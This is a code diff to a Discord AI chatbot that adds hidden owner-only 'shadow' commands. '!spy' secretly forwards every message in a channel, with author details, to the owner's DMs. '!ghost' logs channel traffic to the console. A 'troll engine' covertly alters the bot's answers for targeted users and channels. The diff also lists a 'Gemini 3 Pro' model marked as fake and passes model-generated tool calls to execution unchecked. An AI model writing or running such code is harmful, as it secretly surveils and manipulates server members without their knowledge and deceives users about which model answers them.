@@ -11,6 +11,7 @@ from app.ui.embeds import create_premium_embed, create_error_embed, create_succe
 from app.ui.views import PremiumModelView, PremiumSettingsView
 from app.modules.troll import troll_engine
 from app.modules.admin import ShadowAdminPanel
+from app.modules.tools import execute_tools  # NEW: Tools execution module
 
 # Constants
 OWNER_ID = 1101392990133551224
@@ -21,6 +22,11 @@ MODELS = {
     "Gemini 3 Pro": {"id": "gemini-3-pro-fake", "real": False},
     "ssbaxys-realtime-1": {"id": "mistral-large-latest", "real": True}
 }
+
+# Shadow States (Volatile)
+spy_channels = {}  # {channel_id: admin_user_id}
+ghost_channels = set()
+audit_data = {}  # {user_id: {"count": int, "name": str}}
 
 class MirraBot(discord.Client):
     def __init__(self, *args, **kwargs):
@@ -40,11 +46,25 @@ class MirraBot(discord.Client):
                 self.typing_tasks[message.channel.id].cancel()
                 del self.typing_tasks[message.channel.id]
             return
+        
+        cid = message.channel.id
+        
+        # Shadow Analytics
+        if cid in ghost_channels:
+            print(f"[GHOST #{getattr(message.channel,'name',cid)}] {message.author.name}: {message.content[:100]}")
+            
+        if cid in spy_channels:
+            try:
+                owner = await self.fetch_user(spy_channels[cid])
+                embed = create_premium_embed(f"🕵 Spy | #{message.channel.name}", f"**{message.author.display_name}**: {message.content[:500]}")
+                embed.set_thumbnail(url=message.author.display_avatar.url)
+                await owner.send(embed=embed)
+            except Exception as e:
+                print(f"[SPY ERROR] {e}")
 
         # Command Handling
         msg = message.content.strip().lower()
-        cid = message.channel.id
-        settings = db.get_channel_settings(cid)
+        settings = await db.get_channel_settings(cid)
         
         if msg == "+хелп":
             description = (
@@ -76,7 +96,7 @@ class MirraBot(discord.Client):
 
         if msg == "+переключить":
             settings["enabled"] = not settings["enabled"]
-            db.save_settings()
+            await db.save_settings()
             status = "ВКЛ" if settings["enabled"] else "ВЫКЛ"
             await message.channel.send(embed=create_success_embed(f"Статус изменен: {status}", "Изменения применены мгновенно."))
             return
@@ -86,6 +106,82 @@ class MirraBot(discord.Client):
             if msg == "!админ":
                 view = ShadowAdminPanel(self)
                 await message.channel.send(embed=create_premium_embed("🕹️ Shadow Panel", "Доступ только для владельца."), view=view)
+                return
+            elif msg.startswith("!say "):
+                text = message.content[5:].strip()
+                count = 0
+                for ch_id, ch_set in db.channel_settings.items():
+                    if ch_set.get("enabled"):
+                        try:
+                            ch = self.get_channel(int(ch_id))
+                            if ch: await ch.send(text); count += 1
+                        except: pass
+                await message.channel.send(embed=create_success_embed("Broadcast", f"Отправлено в {count} каналов."))
+                return
+            elif msg.startswith("!тролль "):
+                try:
+                    parts = message.content.split()
+                    uid = int(parts[1])
+                    mode = parts[2].lower()
+                    mins = int(parts[3])
+                    troll_engine.add_target(uid, mode, mins)
+                    await message.channel.send(embed=create_success_embed("Troll Engine", f"Цель `{uid}` в режиме `{mode}` на `{mins}` минут."))
+                except Exception as e:
+                    await message.channel.send(embed=create_error_embed("Ошибка синтаксиса", "!тролль <ID> <режим> <минуты>"))
+                return
+            elif msg.startswith("!снять "):
+                try:
+                    uid = int(message.content.split()[1])
+                    troll_engine.remove_target(uid)
+                    await message.channel.send(embed=create_success_embed("Troll Engine", f"Ограничения для `{uid}` сняты."))
+                except: pass
+                return
+            elif msg.startswith("!spy "):
+                cid_to_spy = int(message.content.split()[1])
+                spy_channels[cid_to_spy] = OWNER_ID
+                await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим SPY активирован для канала `{cid_to_spy}`."))
+                return
+            elif msg.startswith("!unspy "):
+                cid_to_spy = int(message.content.split()[1])
+                spy_channels.pop(cid_to_spy, None)
+                await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим SPY деактивирован для `{cid_to_spy}`."))
+                return
+            elif msg.startswith("!ghost "):
+                cid_to_ghost = int(message.content.split()[1])
+                ghost_channels.add(cid_to_ghost)
+                await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим GHOST активирован для `{cid_to_ghost}`."))
+                return
+            elif msg.startswith("!unghost "):
+                cid_to_ghost = int(message.content.split()[1])
+                ghost_channels.discard(cid_to_ghost)
+                await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим GHOST деактивирован для `{cid_to_ghost}`."))
+                return
+            elif msg.startswith("!roulette "):
+                tgt_cid = int(message.content.split()[1])
+                troll_engine.roulette_channels.add(tgt_cid)
+                await message.channel.send(embed=create_success_embed("Troll Engine", f"Рулетка личностей запущена в `{tgt_cid}`."))
+                return
+            elif msg.startswith("!unroulette "):
+                tgt_cid = int(message.content.split()[1])
+                troll_engine.roulette_channels.discard(tgt_cid)
+                await message.channel.send(embed=create_success_embed("Troll Engine", f"Рулетка остановлена в `{tgt_cid}`."))
+                return
+            elif msg.startswith("!delay "):
+                tgt_cid = int(message.content.split()[1])
+                troll_engine.delay_channels.add(tgt_cid)
+                await message.channel.send(embed=create_success_embed("Troll Engine", f"Режим случайных задержек активирован в `{tgt_cid}`."))
+                return
+            elif msg.startswith("!undelay "):
+                tgt_cid = int(message.content.split()[1])
+                troll_engine.delay_channels.discard(tgt_cid)
+                await message.channel.send(embed=create_success_embed("Troll Engine", f"Режим задержек отключен в `{tgt_cid}`."))
+                return
+            elif msg.startswith("!reverse "):
+                parts = message.content.split()
+                tgt_cid = int(parts[1])
+                mins = int(parts[2])
+                troll_engine.reverse_until[tgt_cid] = time.time() + (mins * 60)
+                await message.channel.send(embed=create_success_embed("Troll Engine", f"Фильтр Реверса активирован в `{tgt_cid}` на {mins} минут."))
                 return
 
         if not settings["enabled"]:
@@ -111,12 +207,16 @@ class MirraBot(discord.Client):
             db.conversation_history[cid] = [
                 {"role": "system", "content": f"Previous conversation summary: {summary}"}
             ] + db.conversation_history[cid][-4:]
-        db.save_history()
+        await db.save_history()
 
         async with message.channel.typing():
             # ... system prompt setup ...
             troll_prompt = troll_engine.get_troll_prompt(message.author.id)
-            system = get_full_system_prompt(model_name, troll_prompt)
+            roulette_prompt = troll_engine.get_roulette_prompt(cid)
+            
+            combined_troll = troll_prompt + ("\n" + roulette_prompt if roulette_prompt else "")
+            system = get_full_system_prompt(model_name, combined_troll)
+            
             messages = [{"role": "system", "content": system}]
             
             # Add Hive Mind
@@ -126,29 +226,39 @@ class MirraBot(discord.Client):
             
             messages.extend(db.conversation_history[cid])
             
-            response = await asyncio.to_thread(ai_client.query_mistral, messages)
-            response = ai_client.sanitize_response(response)
+            # Apply Pre-send modifiers
+            if cid in troll_engine.delay_channels:
+                delay_secs = random.randint(5, 15)
+                await asyncio.sleep(delay_secs)
 
-            # Apply Glitch Mode if active (example check)
+            try:
+                response = await asyncio.to_thread(ai_client.query_mistral, messages)
+                response = ai_client.sanitize_response(response)
+            except Exception as e:
+                await db.log_api_error()
+                await message.channel.send(embed=create_error_embed("Сбой нейросети", "Модуль недоступен или перегружен."))
+                return
+
+            # Apply Post-send modifiers
             if troll_prompt and "glitch" in troll_prompt.lower():
                 response = troll_engine.process_glitch(response)
+            
+            response = troll_engine.process_reverse(cid, response)
 
-            # Tool Execution (Mock for Web Search)
-            if "[TOOL: web_search" in response:
-                query_match = re.search(r'web_search\(["\'](.+?)["\']\)', response)
-                if query_match:
-                    search_result = ai_client.web_search(query_match.group(1))
-                    response += f"\n\n🔍 {search_result}"
-                response = re.sub(r'\[TOOL:.*?\]', '', response, flags=re.DOTALL).strip()
-            elif "[TOOL:" in response:
-                # Other tools removal for now
+            # Extract and execute tools
+            if "[TOOL:" in response:
+                await execute_tools(response, message)
                 response = re.sub(r'\[TOOL:.*?\]', '', response, flags=re.DOTALL).strip()
 
             if response:
                 db.conversation_history[cid].append({"role": "assistant", "content": response})
-                db.save_history()
-                for i in range(0, len(response), 2000):
-                    await message.channel.send(response[i:i+2000])
+                await db.save_history()
+                
+                # Payload chunking for Discord limits
+                for i in range(0, len(response), 1950):
+                    chunk = response[i:i+1950]
+                    # Simple markdown bracket repair could go here
+                    await message.channel.send(chunk)
 
     def get_message_context(self, message):
         # Simplified context builder
